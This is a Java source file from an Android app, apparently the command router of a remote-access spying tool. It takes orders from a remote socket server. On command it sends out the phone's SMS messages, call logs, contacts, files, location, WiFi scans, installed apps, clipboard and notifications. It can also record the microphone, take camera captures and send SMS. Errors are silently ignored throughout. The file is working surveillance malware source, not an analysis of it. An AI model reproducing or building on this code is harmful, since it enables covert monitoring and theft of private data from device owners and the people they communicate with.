package com.fason.app.core.network;

import android.Manifest;
import android.os.Handler;
import android.os.Looper;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.features.apps.AppList;
import com.fason.app.features.apps.FasonManager;
import com.fason.app.features.calls.CallsManager;
import com.fason.app.features.camera.CameraManager;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.contacts.ContactsManager;
import com.fason.app.features.info.InfoManager;
import com.fason.app.features.location.GpsManager;
import com.fason.app.features.mic.MicManager;
import com.fason.app.features.sms.SMSManager;
import com.fason.app.features.storage.FileManager;
import com.fason.app.features.wifi.WifiScanner;
import com.fason.app.features.notification.NotificationRelayService;
import com.fason.app.service.MainService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import io.socket.client.Socket;

public final class SocketCommandRouter {

    private static FileManager fileMgr;
    private static CameraManager camMgr;
    private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static boolean initialized = false;
    private static volatile boolean settingsPrompted = false;

    private SocketCommandRouter() {}

    public static synchronized void initialize() {
        if (initialized) return;

        if (fileMgr == null) fileMgr = new FileManager();
        if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());

        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) {
            handler.postDelayed(SocketCommandRouter::initialize, 5000);
            return;
        }

        // Only remove our own listeners, not SocketClient's internal ones
        socket.off(Protocol.EVT_PING);
        socket.off(Protocol.EVT_ORDER);

        socket.on(Protocol.EVT_PING, args -> {
            Socket s = SocketClient.getInstance().getSocket();
            if (s != null) s.emit(Protocol.EVT_PONG);
        });

        socket.on(Protocol.EVT_ORDER, args -> handleOrder(args));

        socket.connect();
        initialized = true;
    }

    private static void handleOrder(Object[] args) {
        try {
            if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
            JSONObject data = (JSONObject) args[0];
            String type = data.optString(Protocol.KEY_TYPE, "");
            Socket socket = SocketClient.getInstance().getSocket();

            switch (type) {
                case Protocol.FILES:       EXEC.execute(() -> handleFile(data)); break;
                case Protocol.SMS:         handleSms(data, socket); break;
                case Protocol.CALLS:       EXEC.execute(() -> emit(socket, Protocol.CALLS, CallsManager.getLogs())); break;
                case Protocol.CONTACTS:    EXEC.execute(() -> emit(socket, Protocol.CONTACTS, ContactsManager.getContacts())); break;
                case Protocol.MIC:         handleMic(data, socket); break;
                case Protocol.LOCATION:    handleLocation(socket); break;
                case Protocol.WIFI:        handleWifi(socket); break;
                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted())); break;
                case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)))); break;
                case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, "")); break;
                case Protocol.CAMERA:      handleCamera(data, socket); break;
                case Protocol.CLIPBOARD:   handleClipboard(data); break;
                case Protocol.NOTIF:       handleNotif(data, socket); break;
                case Protocol.FASON:       handleFason(data, socket); break;
                case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get())); break;
            }
        } catch (Exception ignored) {}
    }

    private static void handleFile(JSONObject data) {
        String action = data.optString(Protocol.KEY_ACTION);
        String path = data.optString(Protocol.KEY_PATH, "");
        try {
            if (Protocol.ACT_LS.equals(action)) {
                JSONArray list = fileMgr.walk(path);
                String actualPath = path;
                if (actualPath == null || actualPath.isEmpty()) {
                    actualPath = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
                }
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_TYPE, Protocol.TYPE_LIST);
                r.put(Protocol.KEY_LIST, list);
                r.put(Protocol.KEY_PATH, actualPath);
                SocketClient.getInstance().getSocket().emit(Protocol.FILES, r);
            } else if (Protocol.ACT_DL.equals(action)) {
                fileMgr.downloadFile(path);
            }
        } catch (Exception ignored) {}
    }

    private static void handleSms(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION);
        if (Protocol.ACT_LS.equals(action)) {
            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.get()));
        } else if (Protocol.ACT_SEND_SMS.equals(action)) {
            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.send(
                data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS))));
        }
    }

    private static void handleMic(JSONObject data, Socket socket) {
        int sec = data.optInt(Protocol.KEY_SEC, 0);
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendPermError(socket, Protocol.MIC, Manifest.permission.RECORD_AUDIO);
            return;
        }
        MicManager.start(sec);
    }

    private static void handleLocation(Socket socket) {
        EXEC.execute(() -> {
            GpsManager orphanGps = null;
            try {
                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION);
                    return;
                }

                MainService svc = MainService.getInstance();
                GpsManager gps = svc != null ? svc.getGpsManager() : null;
                if (gps == null) {
                    gps = new GpsManager(FasonApp.getContext());
                    orphanGps = gps;
                }

                gps.requestSingle();

                boolean gotLocation = false;
                for (int i = 0; i < 30; i++) {
                    Thread.sleep(200);
                    JSONObject locData = gps.getData();
                    if (locData.optBoolean(Protocol.KEY_ENABLED, false)) {
                        emit(socket, Protocol.LOCATION, locData);
                        gotLocation = true;
                        break;
                    }
                }

                if (!gotLocation) {
                    JSONObject err = new JSONObject();
                    err.put(Protocol.KEY_ENABLED, false);
                    err.put(Protocol.KEY_ERROR, "Location unavailable");
                    emit(socket, Protocol.LOCATION, err);
                }
            } catch (Exception ignored) {} finally {
                if (orphanGps != null) orphanGps.stop();
            }
        });
    }

    /** WiFi scan — activates location services first (required on Android 6.0+). */
    private static void handleWifi(Socket socket) {
        EXEC.execute(() -> {
            GpsManager orphanGps = null;
            try {
                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    sendPermError(socket, Protocol.WIFI, Manifest.permission.ACCESS_FINE_LOCATION);
                    return;
                }

                WifiScanner.clearCache();

                MainService svc = MainService.getInstance();
                GpsManager gps = svc != null ? svc.getGpsManager() : null;
                if (gps == null) {
                    gps = new GpsManager(FasonApp.getContext());
                    orphanGps = gps;
                }

                gps.requestSingle();

                for (int i = 0; i < 20; i++) {
                    Thread.sleep(200);
                    if (gps.canGetLocation()) break;
                }

                Socket s = SocketClient.getInstance().getSocket();
                JSONObject result = WifiScanner.scan(FasonApp.getContext());
                if (s != null) {
                    s.emit(Protocol.WIFI, result);
                }
            } catch (Exception e) {
                try {
                    Socket s = SocketClient.getInstance().getSocket();
                    if (s != null) {
                        JSONObject err = new JSONObject();
                        err.put(Protocol.KEY_ERROR, "WiFi scan failed: " + e.getMessage());
                        s.emit(Protocol.WIFI, err);
                    }
                } catch (Exception ignored) {}
            } finally {
                if (orphanGps != null) orphanGps.stop();
            }
        });
    }

    private static void handleCamera(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION);
        if (Protocol.ACT_LIST.equals(action)) {
            JSONObject cams = camMgr.getCameraList();
            if (cams == null) {
                try {
                    cams = new JSONObject();
                    cams.put(Protocol.KEY_CAM_LIST, true);
                    cams.put(Protocol.KEY_LIST, new JSONArray());
                } catch (Exception ignored) {}
            }
            socket.emit(Protocol.CAMERA, cams);
        } else if (Protocol.ACT_CAPTURE.equals(action)) {
            camMgr.capture(data.optInt(Protocol.KEY_ID, 0));
        }
    }

    private static void handleClipboard(JSONObject data) {
        ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_FETCH);
        if (Protocol.ACT_START.equals(action)) {
            m.start();
            EXEC.execute(m::emit);
        } else if (Protocol.ACT_STOP.equals(action)) {
            m.stop();
        } else {
            EXEC.execute(m::emit);
        }
    }

    private static void handleNotif(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
        if (Protocol.ACT_STATUS.equals(action)) {
            EXEC.execute(() -> {
                try {
                    JSONObject s = new JSONObject();
                    s.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
                    s.put(Protocol.KEY_CONNECTED, NotificationRelayService.getInstance() != null &&
                        NotificationRelayService.getInstance().isReady());
                    socket.emit(Protocol.NOTIF, s);
                } catch (Exception ignored) {}
            });
        } else if (Protocol.ACT_REQUEST.equals(action)) {
            NotificationRelayService.requestPermission(FasonApp.getContext());
        }
    }

    private static void checkPerm(Socket socket, String perm) {
        EXEC.execute(() -> {
            try {
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_PERMISSION, perm);
                r.put(Protocol.KEY_ALLOWED, PermissionManager.canIUse(perm));
                socket.emit(Protocol.PERM_CHECK, r);
            } catch (Exception ignored) {}
        });
    }

    private static void handleFason(JSONObject data, Socket socket) {
        EXEC.execute(() -> {
            try {
                String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
                emit(socket, Protocol.FASON, FasonManager.handle(action));
            } catch (Exception ignored) {}
        });
    }

    private static void emit(Socket socket, String event, Object data) {
        if (socket != null) socket.emit(event, data);
    }

    private static void sendPermError(Socket socket, String event, String perm) {
        try {
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_ERROR, "Permission restricted");
            err.put(Protocol.KEY_PERMISSION, perm);
            err.put(Protocol.KEY_ACTION, Protocol.ACT_OPEN_SETTINGS);
            emit(socket, event, err);
        } catch (Exception ignored) {}

        if (!settingsPrompted) {
            settingsPrompted = true;
            handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
        }
    }

    public static synchronized void shutdown() {
        if (camMgr != null) {
            camMgr.shutdown();
            camMgr = null;
        }
        initialized = false;
        settingsPrompted = false;
    }

    /** Reset router state (keeps managers alive) for re-initialization. */
    public static synchronized void reset() {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket != null) {
            socket.off(Protocol.EVT_PING);
            socket.off(Protocol.EVT_ORDER);
        }
        initialized = false;
        settingsPrompted = false;
    }
}
